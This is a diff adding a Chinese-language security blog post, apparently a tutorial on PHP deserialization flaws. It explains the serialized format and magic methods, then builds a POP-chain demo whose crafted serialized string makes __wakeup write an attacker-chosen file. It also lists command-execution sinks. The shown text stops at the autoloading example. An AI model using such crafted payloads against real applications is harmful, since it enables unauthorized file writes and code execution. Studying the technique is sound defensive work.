@@ -1,0 +1,1430 @@
+<!DOCTYPE html>
+<html>
+    <!-- title -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="Lucifaer">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Lucifaer">
+    <meta name="keywords" content="Lucifaer's blog | Lucifaer">
+    <meta name="description" content="Some Lucifaer's security researchers and security analysis">
+    <meta name="Cache-Control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>PHP反序列化漏洞 · Lucifaer&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s 1;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= /css/style.css?v=20180721 as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= /css/mobile.css?v=20180721 media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/favicon.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+        <!-- algolia -->
+        <script>
+            
+            var hits = JSON.parse('{"per_page":10}')
+            var labels = JSON.parse('{"input_placeholder":"Search for Posts","hits_empty":"We did not find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}')
+
+            var algolia = {
+                applicationID: 'K0XKT0INON',
+                apiKey: 'cc8e96eb9aa249bbd7662f7f8f7d70ca',
+                indexName: 'blog',
+                hits: hits,
+                labels: labels
+            }
+        </script>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Lucifaer&#39;s Blog.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">PHP反序列化漏洞</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>Lucifaer's Blog.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style=
+
+
+
+
+
+
+
+
+height:50vh;
+
+>
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            PHP反序列化漏洞
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "PHP">PHP</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "安全研究">安全研究</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count">5,463</span> / Reading time: <span class="post-count">23 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2017/07/19</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>本篇文章为针对PHP反序列化漏洞的介绍与分析。<br><a id="more"></a></p>
+<h1 id="0x00-序列化的作用"><a href="#0x00-序列化的作用" class="headerlink" title="0x00 序列化的作用"></a>0x00 序列化的作用</h1><ul>
+<li>（反）序列化给我们传递对象提供了一种简单的方法。<ul>
+<li><code>serialize()</code>将一个对象转换成一个字符串</li>
+<li><code>unserialize()</code>将字符串还原为一个对象</li>
+</ul>
+</li>
+<li>反序列化的数据本质上来说是没有危害的</li>
+<li>用户可控数据进行反序列化是存在危害的</li>
+</ul>
+<p>可以看到，反序列化的危害，关键还是在于可控或不可控。</p>
+<h1 id="0x01-PHP序列化格式"><a href="#0x01-PHP序列化格式" class="headerlink" title="0x01 PHP序列化格式"></a>0x01 PHP序列化格式</h1><h2 id="1-基础格式"><a href="#1-基础格式" class="headerlink" title="1. 基础格式"></a>1. 基础格式</h2><ul>
+<li>boolean<ul>
+<li>b:<value>;</value></li>
+<li>b:1;  //  True</li>
+<li>b:0;  //  False</li>
+</ul>
+</li>
+<li>integer<ul>
+<li>i:<value>;</value></li>
+<li>i:1;  //  1</li>
+<li>i:-3; //  -3</li>
+</ul>
+</li>
+<li>double<ul>
+<li>d:<value>;</value></li>
+<li>d:1.2345600000000001; //  1.23456（php弱类型所造成的四舍五入现象）</li>
+</ul>
+</li>
+<li>NULL<ul>
+<li>N;    //NULL</li>
+</ul>
+</li>
+<li>string<ul>
+<li>s:<length>:”<value>“;</value></length></li>
+<li>s:8:”INSOMNIA”;   //  “INSOMNIA”</li>
+</ul>
+</li>
+<li>array<ul>
+<li>a:<length>:{key, value pairs};</length></li>
+<li>a:2:{s:4:”key1”;s:6:”value1”;s:6:”value2”;}   //  array(“key1” =&gt; “value1”, “key2” =&gt; “value2”)</li>
+</ul>
+</li>
+</ul>
+<h2 id="2-序列化举例"><a href="#2-序列化举例" class="headerlink" title="2. 序列化举例"></a>2. 序列化举例</h2><blockquote>
+<p>test.php</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $flag = <span class="string">'Inactive'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set_flag</span><span class="params">($flag)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;flag = $flag;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span><span class="params">($flag)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们来生成一下它的序列化字符串：</p>
+<blockquote>
+<p>serialize.php</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">"./test.php"</span>;</span><br><span class="line"></span><br><span class="line">$object = <span class="keyword">new</span> test();</span><br><span class="line">$object-&gt;set_flag(<span class="string">'Active'</span>);</span><br><span class="line">$data = serialize($object);</span><br><span class="line">file_put_contents(<span class="string">'serialize.txt'</span>, $data);</span><br></pre></td></tr></table></figure>
+<p>代码不难懂，我们通过生成的序列化字符串，来细致的分析一下序列化的格式：</p>
+<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-14999100639649.jpg" alt=""></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"test"</span>:<span class="number">1</span>:&#123;s:<span class="number">10</span>:<span class="string">"testflag"</span>;s:<span class="number">6</span>:<span class="string">"Active"</span>;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:&lt;class_name_length&gt;:&quot;&lt;class_name&gt;&quot;:&lt;number_of_properties&gt;:&#123;&lt;properties&gt;&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="3-注意"><a href="#3-注意" class="headerlink" title="3. 注意"></a>3. 注意</h2><p>这里有一个需要注意的地方，<code>testflag</code>明明是长度为8的字符串，为什么在序列化中显示其长度为10？</p>
+<p>翻阅php官方文档我们可以找到答案：</p>
+<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-14999107284787.jpg" alt=""></p>
+<p>对象的私有成员具有加入成员名称的类名称;受保护的成员在成员名前面加上’*’。这些前缀值在任一侧都有空字节。</p>
+<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-14999111683485.jpg" alt=""></p>
+<p>所以说，在我们需要传入该序列化字符串时，需要补齐两个空字节：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"test"</span>:<span class="number">1</span>:&#123;s:<span class="number">10</span>:<span class="string">"%00test%00flag"</span>;s:<span class="number">6</span>:<span class="string">"Active"</span>;&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="4-反序列化示例"><a href="#4-反序列化示例" class="headerlink" title="4. 反序列化示例"></a>4. 反序列化示例</h2><blockquote>
+<p>unserialize.php</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$filename = file_get_contents($filename);</span><br><span class="line"></span><br><span class="line">$object = unserialize($filename);</span><br><span class="line"></span><br><span class="line">var_dump($object-&gt;get_flag());</span><br><span class="line">var_dump($object);</span><br></pre></td></tr></table></figure>
+<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-14999120371570.jpg" alt=""></p>
+<h1 id="0x02-PHP（反）序列化有关的魔法函数"><a href="#0x02-PHP（反）序列化有关的魔法函数" class="headerlink" title="0x02 PHP（反）序列化有关的魔法函数"></a>0x02 PHP（反）序列化有关的魔法函数</h1><ul>
+<li><p><strong>construct(), </strong>destruct()</p>
+<p>  构造函数与析构函数</p>
+</li>
+<li><p><strong>call(), </strong>callStatic()</p>
+<p>  方法重载的两个函数</p>
+<ul>
+<li>__call()是在对象上下文中调用不可访问的方法时触发</li>
+<li>__callStatic()是在静态上下文中调用不可访问的方法时触发。</li>
+</ul>
+</li>
+<li><p><strong>get(), </strong>set()</p>
+<ul>
+<li>__get()用于从不可访问的属性读取数据。</li>
+<li>__set()用于将数据写入不可访问的属性。</li>
+</ul>
+</li>
+<li><p><strong>isset(), </strong>unset()</p>
+<ul>
+<li>__isset()在不可访问的属性上调用isset()或empty()触发。</li>
+<li>__unset()在不可访问的属性上使用unset()时触发。</li>
+</ul>
+</li>
+<li><strong>sleep(), </strong>wakeup()<ul>
+<li>serialize()检查您的类是否具有魔术名<strong>sleep()的函数。如果是这样，该函数在任何序列化之前执行。它可以清理对象，并且应该返回一个数组，其中应该被序列化的对象的所有变量的名称。如果该方法不返回任何内容，则将NULL序列化并发出E_NOTICE。</strong>sleep()的预期用途是提交挂起的数据或执行类似的清理任务。此外，如果您有非常大的对象，不需要完全保存，该功能将非常有用。</li>
+<li>unserialize()使用魔术名<strong>wakeup()检查函数的存在。如果存在，该功能可以重构对象可能具有的任何资源。</strong>wakeup()的预期用途是重新建立在序列化期间可能已丢失的任何数据库连接，并执行其他重新初始化任务。  </li>
+</ul>
+</li>
+<li><p>__toString()</p>
+<ul>
+<li>__toString（）方法允许一个类决定如何处理像一个字符串时它将如何反应。</li>
+</ul>
+</li>
+<li><p>__invoke()</p>
+<p>  当脚本尝试将对象调用为函数时，调用__invoke()方法。</p>
+</li>
+<li><p>__set_state()</p>
+</li>
+<li>__clone()</li>
+<li>__debugInfo()</li>
+</ul>
+<h1 id="0x03-PHP反序列化与POP链"><a href="#0x03-PHP反序列化与POP链" class="headerlink" title="0x03 PHP反序列化与POP链"></a>0x03 PHP反序列化与POP链</h1><h2 id="1-魔术方法与POP链"><a href="#1-魔术方法与POP链" class="headerlink" title="1. 魔术方法与POP链"></a>1. 魔术方法与POP链</h2><p>就如前文所说，当反序列化参数可控时，可能会产生严重的安全威胁。<br>面向对象编程从一定程度上来说，就是完成类与类之间的调用。就像ROP一样，POP链起于一些小的“组件”，这些小“组件”可以调用其他的“组件”。在PHP中，“组件”就是这些魔术方法（<code>__wakeup()</code>或<code>__destruct</code>）。</p>
+<p>一些对我们来说有用的POP链方法：</p>
+<ul>
+<li>命令执行：<ul>
+<li>exec()</li>
+<li>passthru()</li>
+<li>popen()</li>
+<li>system()</li>
+</ul>
+</li>
+<li>文件操作：<ul>
+<li>file_put_contents()</li>
+<li>file_get_contents()</li>
+<li>unlink()</li>
+</ul>
+</li>
+</ul>
+<h2 id="2-POP链demo"><a href="#2-POP链demo" class="headerlink" title="2. POP链demo"></a>2. POP链demo</h2><blockquote>
+<p>popdemo.php</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">popdemo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $data = <span class="string">"demo\n"</span>;</span><br><span class="line">    <span class="keyword">private</span> $filename = <span class="string">'./demo'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __wakeup() method.</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;save(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">($filename)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        file_put_contents($filename, <span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>上面的代码即完成了一个简单的POP链，若传入一个构造好的序列化字符串，则会完成写文件操作。</p>
+<blockquote>
+<p>poc.php</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">"./popdemo.php"</span>;</span><br><span class="line">$demo = <span class="keyword">new</span> popdemo();</span><br><span class="line">file_put_contents(<span class="string">'./pop_serialized.txt'</span>, serialize($demo));</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>pop_unserialize.php</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">"./popdemo.php"</span>;</span><br><span class="line">unserialize(file_get_contents(<span class="string">'./pop_serialized.txt'</span>));</span><br></pre></td></tr></table></figure>
+<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-14999166628793.jpg" alt=""></p>
+<p>表面看上去，我们完美的执行了代码的功能，那么我们改一下序列化代码，看一看效果：</p>
+<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-14999171016380.jpg" alt=""></p>
+<p>改为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">7</span>:<span class="string">"popdemo"</span>:<span class="number">2</span>:&#123;s:<span class="number">13</span>:<span class="string">"popdemodata"</span>;s:<span class="number">5</span>:<span class="string">"hack</span></span><br><span class="line"><span class="string">"</span>;s:<span class="number">17</span>:<span class="string">"popdemofilename"</span>;s:<span class="number">6</span>:<span class="string">"./hack"</span>;&#125;</span><br></pre></td></tr></table></figure>
+<p>便执行了我们想要执行的效果：</p>
+<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-14999174258769.jpg" alt=""></p>
+<h2 id="3-Autoloading与（反）序列化威胁"><a href="#3-Autoloading与（反）序列化威胁" class="headerlink" title="3. Autoloading与（反）序列化威胁"></a>3. Autoloading与（反）序列化威胁</h2><ul>
+<li>PHP只能<code>unserialize()</code>那些定义了的类</li>
+<li>传统的PHP要求应用程序导入每个类中的所有类文件，这样就意味着每个PHP文件需要一列长长的<code>include</code>或<code>require</code>方法，而在当前主流的PHP框架中，都采用了Autoloading自动加载类来完成这样繁重的工作。</li>
+<li>在完善简化了类之间调用的功能的同时，也为序列化漏洞造成了便捷。</li>
+</ul>
+<p>举个例子：</p>
+<p>目录结构为下：</p>
+<p><img src="http://oqt4gj54x.bkt.clouddn.com/2018-08-09-14999254540532.jpg" alt=""></p>
+<blockquote>
+<p>index.php</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">autoload</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">load1</span><span class="params">($className)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_file($className.<span class="string">'.php'</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">require</span> $className.<span class="string">'.php'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">load2</span><span class="params">($className)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_file(<span class="string">'./app/'</span>.$className.<span class="string">'.php'</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">require</span> <span class="string">'./app/'</span>.$className.<span class="string">'.php'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">load3</span><span class="params">($className)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_file(<span class="string">'./lib/'</span>.$className.<span class="string">'.php'</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">require</span> <span class="string">'./lib/'</span>.$className.<span class="string">'.php'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">spl_autoload_register(<span class="string">'autoload::load1()'</span>);</span><br><span class="line">spl_autoload_register(<span class="string">'autoload::load2()'</span>);</span><br><span class="line">spl_autoload_register(<span class="string">'autoload::load3()'</span>);</span><br><span class="line"></span><br><span class="line">$test1 = <span class="keyword">new</span> test1();</span><br><span class="line">$test2 = <span class="keyword">new</span> test2();</span><br><span class="line">$test3 = <span class="keyword">new</span> test3();</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>test1.php</p>
+</blockquote>
